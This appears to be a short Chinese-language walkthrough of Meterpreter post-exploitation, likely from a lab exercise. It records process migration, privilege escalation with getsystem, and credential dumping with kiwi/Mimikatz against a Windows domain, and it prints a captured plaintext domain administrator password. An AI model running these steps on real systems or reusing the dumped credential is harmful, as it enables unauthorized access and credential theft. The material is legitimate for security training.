## 获取当前用户信息

```
getuid
```

![image-20250603125405059](./assets/image-20250603125405059.png)



## 获取进程信息

```
getpid
ps
```

![image-20250603125419348](./assets/image-20250603125419348.png)



## 进程迁移

```
migrate 2936
getpid
```

![image-20250603125441965](./assets/image-20250603125441965.png)



## 提权

```
getsystem
```

提升至system权限



## hashdump

```
load kiwi
?
```

![image-20250603130952851](./assets/image-20250603130952851.png)

```
creds_all
getsystem
creds_all
```

![image-20250603131003636](./assets/image-20250603131003636.png)

尝试抓取，提示非system用户，getsystem后重新抓取

![image-20250603131024253](./assets/image-20250603131024253.png)

成功抓取域控管理员密码

```
zxcASDqw123!!
```

![image-20250603131035203](./assets/image-20250603131035203.png)